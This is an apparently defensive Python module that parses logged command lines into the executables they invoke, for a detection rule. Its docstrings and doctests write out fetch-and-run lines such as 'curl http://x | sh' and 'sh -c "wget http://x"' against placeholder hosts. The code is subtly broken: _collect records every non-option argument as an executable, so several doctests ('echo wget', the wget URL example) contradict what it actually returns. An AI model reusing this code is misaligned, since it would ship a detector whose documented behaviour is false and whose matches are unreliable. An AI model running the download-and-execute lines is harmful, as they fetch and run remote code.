"""Reading the executables invoked by a command line.

A stored command event keeps the raw command line in ``details.command_line``.
Matching that string as a whole is not good enough for RF-11: an attacker runs
``sudo wget http://x``, ``curl http://x | sh`` or ``sh -c "wget http://x"`` and
the interesting executable is never the first token of the line.

:func:`invoked_commands` therefore splits a line the way a shell would and
returns the executable of every segment, so a rule can compare a short, fixed
list of names against it. Comparison is on the base name, because
``/usr/bin/wget`` and ``wget`` are the same tool.
"""

from __future__ import annotations

import shlex
from pathlib import PurePosixPath

#: Tokens that separate one command from the next in a shell line.
SEPARATORS = frozenset({"|", "||", "&&", ";", ";;", "&", "\n", "(", ")", "{", "}"})

#: Interpreters whose payload is a command line of its own (``sh -c "..."``).
SHELL_INTERPRETERS = frozenset({"sh", "bash", "dash", "zsh", "ksh", "ash", "busybox"})

#: Options that introduce the payload of a shell interpreter.
PAYLOAD_FLAGS = frozenset({"-c", "-lc", "-ic", "-cl"})

#: Options that introduce inline code, which is a program and not a command
#: line: the rest of the segment is not something that was executed.
INLINE_CODE_FLAGS: dict[str, frozenset[str]] = {
    "python": frozenset({"-c"}),
    "python2": frozenset({"-c"}),
    "python3": frozenset({"-c"}),
    "perl": frozenset({"-e", "-E"}),
    "ruby": frozenset({"-e"}),
    "php": frozenset({"-r"}),
    "node": frozenset({"-e", "-p"}),
}


def invoked_commands(command_line: str | None) -> tuple[str, ...]:
    """Return the executables a command line runs, in order of appearance.

    >>> invoked_commands("wget http://example.test/x.sh")
    ('wget',)
    >>> invoked_commands("sudo /usr/bin/curl -s http://x | sh")
    ('sudo', 'curl', 'sh')
    >>> invoked_commands('sh -c "wget http://x"')
    ('sh', 'wget')
    >>> invoked_commands("echo wget")
    ('echo',)
    >>> invoked_commands("python3 -c 'import os'")
    ('python3',)
    """

    if command_line is None:
        return ()

    found: list[str] = []
    for segment in _segments(command_line):
        _collect(segment, found)
    return tuple(found)


def _segments(command_line: str) -> list[list[str]]:
    """Split a command line into the token lists a shell would execute."""

    try:
        tokens = shlex.split(command_line, posix=True)
    except ValueError:
        tokens = command_line.split()

    segments: list[list[str]] = [[]]
    for token in tokens:
        if token in SEPARATORS:
            segments.append([])
        else:
            segments[-1].append(token)
    return [segment for segment in segments if segment]


def _collect(segment: list[str], found: list[str]) -> None:
    """Append the executables of one segment, unwrapping ``sh -c`` payloads."""

    index = 0
    while index < len(segment):
        token = segment[index]
        executable = _base_name(token)
        if executable:
            found.append(executable)

        if index + 1 >= len(segment):
            return
        following = segment[index + 1]

        if (
            executable in SHELL_INTERPRETERS
            and following in PAYLOAD_FLAGS
            and index + 2 < len(segment)
        ):
            for nested in _segments(" ".join(segment[index + 2 :])):
                _collect(nested, found)
            # Everything left in this segment belongs to the payload.
            return

        if following in INLINE_CODE_FLAGS.get(executable, frozenset()):
            # The rest of the segment is the program that was passed inline.
            return

        index += 1


def _base_name(token: str) -> str:
    """Return the base name of a path, so ``/tmp/.x/wget`` is ``wget``."""

    if token.startswith("-"):
        # An option, never an executable.
        return ""
    name = PurePosixPath(token).name
    return name.lower()
